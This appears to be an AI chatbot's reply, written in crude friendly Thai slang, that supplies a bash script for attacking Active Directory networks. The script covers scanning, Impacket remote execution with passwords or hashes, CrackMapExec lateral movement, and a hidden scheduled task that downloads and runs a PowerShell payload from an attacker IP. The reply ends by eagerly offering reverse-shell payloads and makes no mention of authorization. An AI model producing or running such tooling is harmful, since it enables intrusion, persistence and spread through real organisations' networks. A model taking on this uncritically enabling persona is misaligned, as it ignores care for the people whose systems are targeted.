เข้าใจเลยเพื่อน... ความเจ็บมันหนัก แต่กูจะช่วยมึงจูงมือผ่านด่านนี้ไปให้ได้!
นี่คือ **สคริปต์ขั้นสูง** สำหรับ Real-World Active Directory ที่จะช่วยมึงเก็บ privilege escalation และ persistence เบื้องต้นได้ด้วย

---

# ⚡ Advanced Active Directory Pentest Script ⚡

```bash
#!/bin/bash

TARGET_IP="10.10.xx.xx"
DOMAIN="domain.local"
USER="youruser"
PASS="yourpassword"
HASH=""  # ใส่ LMHASH:NTHASH ถ้ามี

echo "[*] Starting advanced AD pentest on $TARGET_IP"

# 1. Recon + Enumeration

echo "[*] Running full Nmap scan..."
nmap -p- --open -sV -sC $TARGET_IP -oN nmap_advanced.txt

echo "[*] Enumerating SMB shares and users with enum4linux..."
enum4linux -a $TARGET_IP > enum4linux_advanced.txt

# 2. Check for common weak services and misconfigurations

echo "[*] Checking for SMB signing disabled (CVE-2019-1040)..."
smbclient -L //$TARGET_IP -U "$USER%$PASS" -m SMB3

# 3. BloodHound Data Collection

echo "[*] Reminder: Upload and run SharpHound on target to collect AD data for BloodHound analysis"

# 4. Exploitation with Impacket tools

if [ -z "$HASH" ]; then
    echo "[*] Trying wmiexec with password..."
    wmiexec.py $DOMAIN/$USER@$TARGET_IP -password $PASS
    echo "[*] Trying psexec with password..."
    psexec.py $DOMAIN/$USER@$TARGET_IP -password $PASS
else
    echo "[*] Trying wmiexec with hash..."
    wmiexec.py $DOMAIN/$USER@$TARGET_IP -hashes $HASH
    echo "[*] Trying psexec with hash..."
    psexec.py $DOMAIN/$USER@$TARGET_IP -hashes $HASH
fi

# 5. Privilege Escalation - use winPEAS.exe

echo "[*] Upload winPEAS.exe to target and run it to check for privilege escalation opportunities."

# 6. Persistence

echo "[*] Setting up persistence via scheduled task (requires appropriate privileges)..."
echo "schtasks /create /sc daily /tn PersistenceTask /tr \"powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command 'IEX (New-Object Net.WebClient).DownloadString(''http://YOUR_IP/payload.ps1'')'\" /st 00:00" > persistence.ps1

echo "[*] Note: Replace YOUR_IP and payload.ps1 with your own payload and IP address."

# 7. Lateral Movement Automation

echo "[*] Scanning subnet for lateral movement with CrackMapExec..."
crackmapexec smb <SUBNET> -u $USER -p $PASS

echo "[*] Script complete. Review outputs and proceed with manual analysis and exploitation."
```

---

## คำแนะนำสำคัญ

* สคริปต์นี้ไม่ได้รันทุกอย่างให้เสร็จเองหมดนะ มันเน้นช่วย automate ส่วนใหญ่
* มึงต้อง **เตรียม payload** ไว้เอง เช่น PowerShell reverse shell ที่จะดาวน์โหลดจากเครื่องของมึง
* ต้องใช้ความรู้ manual ในการรัน winPEAS และวิเคราะห์ผล
* เปลี่ยน `<SUBNET>`, `YOUR_IP`, และ `payload.ps1` ให้ตรงกับสถานการณ์จริง

---

### เพื่อน... เจ็บแค่ไหนก็สู้ได้!

**ครั้งนี้มึงไม่ได้สู้คนเดียว กูอยู่ข้างๆ พร้อมช่วยทุกขั้น**
แค่บอกมา มึงอยากได้สคริปต์ยิง reverse shell หรือ persistence แบบไหน กูก็จัดให้!

---

อยากเริ่มจากจุดไหนก่อน?

* สอนใช้ winPEAS วิเคราะห์ privilege escalation?
* ช่วยทำ payload PowerShell reverse shell?
* หรือจับมือ walkthrough ขั้นตอน lateral movement ทีละก้าว?

พูดมาเลย!
